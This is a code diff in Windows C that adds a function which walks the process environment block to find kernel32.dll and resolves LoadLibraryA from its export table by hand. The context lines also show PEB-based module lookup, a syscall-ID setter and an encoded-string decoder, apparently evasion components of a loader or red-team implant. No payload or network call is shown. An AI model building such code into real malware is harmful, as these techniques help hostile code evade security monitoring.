@@ -35,7 +35,6 @@ void SortNumbers() {
     printf("[*] Processed %d numbers. Average value: %.2f\n", ARRAY_SIZE, avg);
 }
 
-
 //GetModuleBaseAddress
 PVOID GetModBA(LPCWSTR moduleName) {
     PPEB pPeb = (PPEB)__readgsqword(0x60); // 0x60 is PEB offset for x64
@@ -84,7 +83,6 @@ void SetSyid(DWORD value) {
     smID = value;
 }
 
-// Function to Resolve APIs
 FARPROC ResolveFn(LPCSTR mod, LPCSTR fn) {
     HMODULE hMod = GetModuleHandle(mod);
     if (!hMod) return NULL;
@@ -129,3 +127,78 @@ char* Bsfd(const char* encoded) {
     decoded[outLen] = '\0';  // Null-terminate the string
     return (char*)decoded;
 }
+
+pLoadLibraryA GetLoadLibraryA() {
+    PPEB pPEB = (PPEB)__readgsqword(0x60);
+    if (!pPEB) {
+        printf("[!] Failed to retrieve PEB.\n");
+        return NULL;
+    }
+
+    PPEB_LDR_DATA pLdr = pPEB->Ldr;
+    if (!pLdr) {
+        printf("[!] Failed to retrieve LDR data.\n");
+        return NULL;
+    }
+
+    LIST_ENTRY* pListHead = &pLdr->InMemoryOrderModuleList;
+    LIST_ENTRY* pEntry = pListHead->Flink;
+
+    while (pEntry != pListHead) {
+        PLDR_DATA_TABLE_ENTRY pDataTable = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+        if (!pDataTable->DllBase) {
+            pEntry = pEntry->Flink;
+            continue;
+        }
+
+        // Get DLL base address
+        HMODULE hModuleBase = (HMODULE)pDataTable->DllBase;
+        WCHAR wDllName[MAX_PATH] = { 0 };
+        memcpy(wDllName, pDataTable->FullDllName.Buffer, pDataTable->FullDllName.Length);
+
+        // Convert to ANSI string
+        char dllName[MAX_PATH] = { 0 };
+        wcstombs(dllName, wDllName, MAX_PATH);
+
+        // Normalize the name (convert to lowercase)
+        for (int i = 0; dllName[i]; i++) {
+            dllName[i] = tolower(dllName[i]);
+        }
+
+        // Check if this is kernel32.dll
+        if (strstr(dllName, "kernel32.dll")) {
+            printf("[*] Found kernel32.dll at: %p\n", hModuleBase);
+
+            // Locate Export Directory
+            IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModuleBase;
+            IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModuleBase + dosHeader->e_lfanew);
+            IMAGE_EXPORT_DIRECTORY* expDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModuleBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+            if (!expDir) {
+                printf("[!] Export directory not found!\n");
+                return NULL;
+            }
+
+            DWORD* names = (DWORD*)((BYTE*)hModuleBase + expDir->AddressOfNames);
+            WORD* ordinals = (WORD*)((BYTE*)hModuleBase + expDir->AddressOfNameOrdinals);
+            DWORD* functions = (DWORD*)((BYTE*)hModuleBase + expDir->AddressOfFunctions);
+
+            for (DWORD i = 0; i < expDir->NumberOfNames; i++) {
+                LPCSTR functionName = (LPCSTR)((BYTE*)hModuleBase + names[i]);
+                if (strcmp(functionName, "LoadLibraryA") == 0) {
+                    printf("[*] LoadLibraryA found at: %p\n", (BYTE*)hModuleBase + functions[ordinals[i]]);
+                    return (pLoadLibraryA)((BYTE*)hModuleBase + functions[ordinals[i]]);
+                }
+            }
+
+            printf("[!] LoadLibraryA not found in kernel32 exports.\n");
+            return NULL;
+        }
+
+        pEntry = pEntry->Flink;
+    }
+
+    printf("[!] Kernel32.dll not found in PEB.\n");
+    return NULL;
+}
+
